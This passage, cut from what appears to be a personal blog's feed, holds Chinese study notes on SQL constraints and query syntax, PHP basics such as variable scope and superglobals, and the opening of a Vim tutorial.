title="约束"></a>约束</h2><p><code>SQL</code>约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。约束可以在创建表时规定（通过<code>CREATE TABLE</code>语句），或者在创建表之后规定（通过<code>ALTER TABLE</code>语句）。</p><h3 id="创建约束-CREATE-TABLE"><a href="#创建约束-CREATE-TABLE" class="headerlink" title="创建约束 CREATE TABLE"></a>创建约束 CREATE TABLE</h3><p>创建表时规定约束的语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 data_type1(size) constraint1,</span><br><span class="line">    column2 data_type2(size) constraint2,</span><br><span class="line">    column3 data_type3(size) constraint3,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中 <code>column</code> 为字段名字，<code>data_type </code>为数据类型，<code>constraint</code> 为约束类型，在<code>SQL</code>中，我们有以下约束：</p><blockquote><ul><li>NOT NULL: 字段不能存储空值。</li><li>UNIQUE: 保证字段的每行都是唯一的值。</li><li>PRIMARY KEY: 主键，NOT NULL和UNIQUE的结合，确保某列（或多列）有唯一标识，用于找到特定记录。</li><li>FOREIGN KEY：保证表中的数据匹配到（指向）另一个表中的主键。</li><li>CHECK: 保证字段的值符合指定条件。</li><li>DEFAULT: 规定没赋值时的默认值。</li></ul></blockquote><h3 id="创建约束-ALTER-TABLE"><a href="#创建约束-ALTER-TABLE" class="headerlink" title="创建约束 ALTER TABLE"></a>创建约束 ALTER TABLE</h3><p>另一种添加约束的方法便是使用<code>ALTER TABLE</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line">MODIFY Age <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><p>此语句设定了一个新的约束：<code>Students</code>的<code>Age</code>字段不能为空。</p><p>以下语句添加了一个外键约束：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (classID)</span><br><span class="line"><span class="keyword">REFERENCES</span> Classes(id);</span><br></pre></td></tr></table></figure><p>如果要删除<code>Students</code>中<code>classID</code>的外键约束，我们可以使用以下的语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY fk_class_id;</span><br></pre></td></tr></table></figure><h1 id="基本查询语法"><a href="#基本查询语法" class="headerlink" title="基本查询语法"></a>基本查询语法</h1><h2 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h2><p>如果想要查询表的数据，我们可以使用<code>SELECT</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><h2 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h2><p>使用<code>SELECT * FROM table_name</code>可以查到一张表的所有记录，但有时我们只需要获取符合特定条件的记录，那么我们就可以添加<code>WHERE</code>语句，来限定查询记录的条件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><h3 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h3><p>条件表达式（condition）有很多种，如果我们需要满足多个条件，可以使用 <code>AND</code> 连接多个条件。如果我们希望同时满足两个条件，那么我们需要在WHERE后面加上<code>condtion1 AND condition2</code>。还有一种条件是 <code>NOT condition</code>，代表不符合某种条件，比如我们要选取 <code>Gender</code> 为 ‘M’ 的学生，另一种写法就是 <code>Gender</code> 不为 ‘F’ 即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">WHERE</span> <span class="keyword">NOT</span> Gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span>;</span><br></pre></td></tr></table></figure><p>上面 <code>NOT Gender = ‘F’</code> 等价于 <code>Gender &lt;&gt; ‘F’</code>，所以两种写法都可以。如果要组合三个或更多的条件，那么就需要用圆括号<code>()</code>限制条件的判断顺序。比如我们需要查找<code>Age</code>在20以下或22以上，并且是男生的学生，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">WHERE</span> (Age <span class="operator">&lt;</span> <span class="number">20</span> <span class="keyword">OR</span> Age <span class="operator">&gt;</span> <span class="number">22</span>) <span class="keyword">AND</span> Gender <span class="operator">=</span> <span class="string">&#x27;M&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果不加括号，条件运算则会按照 NOT, AND, OR 的优先级顺序执行，既NOT优先级最高，最低的是OR。以下是常见条件表达式的总结：</p><table><thead><tr><th>条件</th><th>说明</th><th>Example1</th><th>Example2</th></tr></thead><tbody><tr><td>=</td><td>判断相等</td><td>age = 20</td><td>name = ‘xyz’</td></tr><tr><td>&gt;</td><td>判断大于</td><td>age &gt; 20</td><td>name &gt; ‘xyz’</td></tr><tr><td>&gt;=</td><td>判断大于等于</td><td>age &gt;= 20</td><td>name &gt;= ‘xyz’</td></tr><tr><td>&lt;</td><td>判断小于</td><td>age &lt; 20</td><td>name &lt; ‘xyz’</td></tr><tr><td>&lt;=</td><td>判断小于等于</td><td>age &lt;= 20</td><td>name &lt;= ‘xyz’</td></tr><tr><td>&lt;&gt;</td><td>判断不等于</td><td>age &lt;&gt; 20</td><td>name &lt;&gt; ‘xyz’</td></tr><tr><td>LIKE</td><td>判断相似</td><td></td><td>name LIKE ‘xy%’（%表示任意字符，xy%表示以xy为开头的字符）</td></tr></tbody></table><h2 id="投影查询"><a href="#投影查询" class="headerlink" title="投影查询"></a>投影查询</h2><p>使用<code>SELECT * FROM table_name WHERE condition</code>可以选出表中的若干条记录，所返回的记录字段和原表是相同的，即结果的所有字段与原表的所有字段都一一对应。如果我们只希望返回某些特定字段的数据，而不是所有字段的数据，我们可以用 <code>SELECT column1, column2, … FROM table_name;</code> 让结果集仅包含指定字段。这种操作称为投影查询。</p><p>如果我们只想要不同的数据，可以使用<code>SELECT DISTINCT</code>，语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column1, column2, ... <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><p>如果我们只想知道学生来自哪些不同的城市，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> City <span class="keyword">FROM</span> Students;</span><br></pre></td></tr></table></figure><h2 id="排序ORDER-BY"><a href="#排序ORDER-BY" class="headerlink" title="排序ORDER BY"></a>排序ORDER BY</h2><p>当我们使用SELECT查询的时候，查询的结果往往是根据主键排序的，在我们的例子中就是按照<code>StudentID</code>排序的。如果我们想要根据我们自定义的字段排序的话，我们可以在最后加上<code>ORDER BY</code>，以下是<code>ORDER BY</code>的语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> col1, col2, ... </span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> col1, col2, ... <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>例如，我们希望学生按照年龄从小到大排好序，那么就可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age;</span><br></pre></td></tr></table></figure><p>如果我们不在<code>ORDE BY</code>最后加上 <code>ASC</code> 或 <code>DESC</code>，那么就是默认从小到大排好序的。其中 <code>ASC</code> 表示从小到大的顺序，<code>DESC</code>表示倒序，以下语句获得的学生则会根据年龄从大到小排好序：w</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>如果我们希望结果按照年纪从小到大排好序后，再根据性别排序的话，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age <span class="keyword">ASC</span>, Gender;</span><br></pre></td></tr></table></figure><p>如果有WHERE子句，那么ORDER BY需要放在WHERE后面，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students </span><br><span class="line"><span class="keyword">WHERE</span> City <span class="operator">=</span> <span class="string">&#x27;Shanghai&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Age;</span><br></pre></td></tr></table></figure><h2 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h2><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>假设我们要统计学生表的记录数量，除了直接使用<code>SELECT * FROM Students</code>得到结果集后，通过手动查询数量这种麻烦的方法外，我们可以使用<code>SQL</code>提供的聚合函数 <code>COUNT</code>，快速获得结果。以查询有多少学生为例，我们以下<code>SQL</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students;</span><br></pre></td></tr></table></figure><p>除了 <code>COUNT</code> 函数外，<code>SQL</code>还提供以下这些常用的聚合函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUM</td><td>计算某一列的总和，该列必须为数值类型</td></tr><tr><td>AVG</td><td>计算某一列的平均数，该列必须为数值类型</td></tr><tr><td>MAX</td><td>计算某一列的最大值</td></tr><tr><td>MIN</td><td>计算某一列的最小值</td></tr></tbody></table><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p><code>SQL</code>还提供了“分组聚合”功能，帮助我们将具有共性字段的记录整合起来。比如我们想要根据城市<code>City</code>对学生进行分组，并需要查询每个城市有多少学生，可以使用<code>GROUP BY</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City;</span><br></pre></td></tr></table></figure><p>执行此语句后，GROUP BY子句会按照City将学生进行分组，所有City相同的学生会被放到同一个组中，再进行分别计算，所以COUNT(*)的结果对应的就是特定城市的学生数量。其结果类似以下：</p><table><thead><tr><th>City</th><th>COUNT(*)</th></tr></thead><tbody><tr><td>Beijing</td><td>1</td></tr><tr><td>Los Angeles</td><td>2</td></tr><tr><td>New York City</td><td>1</td></tr><tr><td>Shanghai</td><td>2</td></tr></tbody></table><p>如果我们将Name也放入查询结果，就不合适了，因为来自相同城市的学生可能有很多位，名字就各不相同了，所以以下语句是不合法的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, <span class="built_in">COUNT</span>(<span class="operator">*</span>), Name <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City;</span><br></pre></td></tr></table></figure><p>GROUP BY 也能放入多个字段，比如我们想先将学生根据City分组，然后再根据性别分组，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, Gender, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City, Gender;</span><br></pre></td></tr></table></figure><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><p><code>SELECT</code> 查询除了能从单表中查数据外，也能从多表中查询数据。语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1, table2;</span><br></pre></td></tr></table></figure><p>比如要查询<code>Students</code>表和<code>Courses</code>表的“乘积”，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>假设<code>Students</code>有5列字段和7行记录，<code>Courses</code>有2列字段和3行记录，其结果就是一个拥有21 (3 * 7) 行记录和 7 (5 + 2) 列字段的二维表，既Students表的每一行和Courses表的每一行两两拼在一起。结果集的列数会是两表列数之和，而行数是两表行数之积。</p><p>有时候两张表可能拥有相同名字的字段，那么结果则会让人疑惑，我们可以通过使用 AS 取别名来区别字段。比如使用以下语句给<code>StudentID</code>和<code>CourseID</code>改名为<code>StudentId</code>和<code>CourseId</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Students.StudentID <span class="keyword">AS</span> StudentId, Courses.CourseID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>给字段取别名的语法类似 <code>column_name AS new_column_name</code>，上面的语句分别给<code>StudentID</code>和<code>CoursesID</code>取了别名<code>StudentId</code>和<code>CourseId</code>，虽然在这个例子中，我们只是将最后的字母D变为小写。但考虑一下另一种情况：假设<code>Students</code>和<code>Courses</code>的主键字段都叫ID，那么这个别名就很有帮助了，我们可以使用以下语句使查询结果更明了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Students.ID <span class="keyword">AS</span> StudentId, Courses.ID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>除了给输出字段取别名外，给表格取别名也很有用的，语法类似<code>table_name AS alias</code>，我们可以将上面的语句写成下面这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.ID <span class="keyword">AS</span> StudentId, C.ID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students <span class="keyword">AS</span> S, Courses <span class="keyword">AS</span> C;</span><br></pre></td></tr></table></figure><p>在多表查询中，我们同样还是能使用<code>WHERE</code>子句。为了帮助大家理解之后的内容，我们需要给<code>Students</code>添加一列新的字段<code>CourseID</code>，代表此学生选择的课程：</p><table><thead><tr><th>StudentID</th><th>Name</th><th>Gender</th><th>Age</th><th>City</th><th>CourseID</th></tr></thead><tbody><tr><td>1</td><td>David</td><td>M</td><td>21</td><td>Shanghai</td><td>2</td></tr></tbody></table><p>如果我们如果想要抓取<code>StudentID</code>和其对应的课程名字，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.StudentID, C.CourseName <span class="keyword">FROM</span> Students <span class="keyword">AS</span> S, Courses <span class="keyword">AS</span> C <span class="keyword">WHERE</span> S.CourseID <span class="operator">=</span> C.CourseID;</span><br></pre></td></tr></table></figure><p>除了<code>WHERE</code>子句，其他子句类似<code>ORDER BY</code>，<code>GROUP BY</code>也都适用于多表查询。</p>]]></content>
    
    
    <summary type="html">数据库基础语法笔记</summary>
    
    
    
    <category term="数据库" scheme="http://jacen-cpu.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="SQL" scheme="http://jacen-cpu.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>php基础知识</title>
    <link href="http://jacen-cpu.github.io/2021/07/11/php%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://jacen-cpu.github.io/2021/07/11/php%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2021-07-10T23:10:05.000Z</published>
    <updated>2021-07-14T02:08:12.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>PHP脚本以<code>&lt;php?</code>开头，以<code>?&gt;</code>结尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">    <span class="comment">//代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php文件的默认扩展名是<code>.php</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">    <span class="comment">// 单行注释</span></span><br><span class="line">    <span class="comment"># 单行注释</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    多</span></span><br><span class="line"><span class="comment">    行</span></span><br><span class="line"><span class="comment">    注</span></span><br><span class="line"><span class="comment">    释</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php的大小写敏感"><a href="#php的大小写敏感" class="headerlink" title="php的大小写敏感"></a>php的大小写敏感</h3><p>所有用户定义的函数、类、关键词都对大小写不敏感。</p><p>所有的变量都对大小写敏感。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li>变量以<code>$</code>开头</li><li>变量名以字母和下划线开头</li><li>变量名不能以数字开头</li><li>变量名只能包含字母、数字、下划线</li></ul><p><strong>变量会在首次赋值时被创建。</strong></p><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h3 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h3><p>通常php变量只有一个单独的范围，这个单独的范围，还包括了include和require引入的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;b.inc&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是在用户自定义的函数中，则不然。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>这个脚本不会有任何输出。此时我们可以用<code>global</code>关键字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还有一种方法是使用php自定义的<code>$GLOBALS</code>数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sum</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;a&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">Sum();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>它只在局部函数中存在，当程序执行离开此作用域时，其值不会丢失。</p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与以下语句输出完全相同的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h2><h3 id="POST和GET的区别"><a href="#POST和GET的区别" class="headerlink" title="POST和GET的区别"></a>POST和GET的区别</h3><p>通过GET方法从表单发送的信息对任何人都是可见的，数据数量限制在2000个字符。用于发送非敏感的数据。</p><p>通过POST方法从表单发送的信息对其他人是不可见发，数据数量也是无限制的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本语法&quot;&gt;&lt;a href=&quot;#基本语法&quot; class=&quot;headerlink&quot; title=&quot;基本语法&quot;&gt;&lt;/a&gt;基本语法&lt;/h2&gt;&lt;p&gt;PHP脚本以&lt;code&gt;&amp;lt;php?&lt;/code&gt;开头，以&lt;code&gt;?&amp;gt;&lt;/code&gt;结尾。&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    <category term="后端" scheme="http://jacen-cpu.github.io/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
    <category term="php" scheme="http://jacen-cpu.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Vim基础</title>
    <link href="http://jacen-cpu.github.io/2021/04/23/Vim%E5%9F%BA%E7%A1%80/"/>
    <id>http://jacen-cpu.github.io/2021/04/23/Vim%E5%9F%BA%E7%A1%80/</id>
    <published>2021-04-23T12:50:00.000Z</published>
    <updated>2021-05-21T11:12:01.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><blockquote><p><strong>Vim</strong>是从<a class="link"   href="https://zh.wikipedia.org/wiki/Vi" >vi<i class="fas fa-external-link-alt"></i></a>发展出来的一个<a class="link"   href="https://zh.wikipedia.org/wiki/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8" >文本编辑器<i class="fas fa-external-link-alt"></i></a>。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和<a class="link"   href="https://zh.wikipedia.org/wiki/Emacs" >Emacs<i class="fas fa-external-link-alt"></i></a>并列成为<a class="link"   href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F" >类Unix系统<i class="fas fa-external-link-alt"></i></a>用户最喜欢的编辑器。</p></blockquote><h1 id="四种模式"><a href="#四种模式" class="headerlink" title="四种模式"></a>四种模式</h1><img src="/2021/04/23/Vim%E5%9F%BA%E7%A1%80/0.png" class=""><ol><li>普通模式（<code>Esc</code>）</li><li>插入模式（<code>i</code>, <code>a</code>, <code>o</code>）</li><li>命令模式（<code>:</code>）</li><li>视图模式（<code>v</code>, <code>V</code>）</li></ol><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p>取代普通的方向键或是鼠标，<code>h</code> 是左， <code>j</code>是下， <code>k</code>是上，<code>l</code> 是右。</p><h2 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h2><p>翻整页： <code>Ctrl + f</code>即<code>Pagedown</code>, <code>Ctrl + b</code>即<code>PageUp</code></p><p>翻半页： <code>Ctrl + d</code>, <code>Ctrl + u</code></p><p>翻到最后一行：<code>shift + g</code>即直接输入大写G。</p><p>翻到第一行：<code>gg</code></p><p>翻到指定的行：<code>ng</code> n为行号。</p><h2 id="不同方式编辑文本，跳跃单词"><a href="#不同方式编辑文本，跳跃单词" class="headerlink" title="不同方式编辑文本，跳跃单词"></a>不同方式编辑文本，跳跃单词</h2><p>编辑：</p><p><code>i</code> 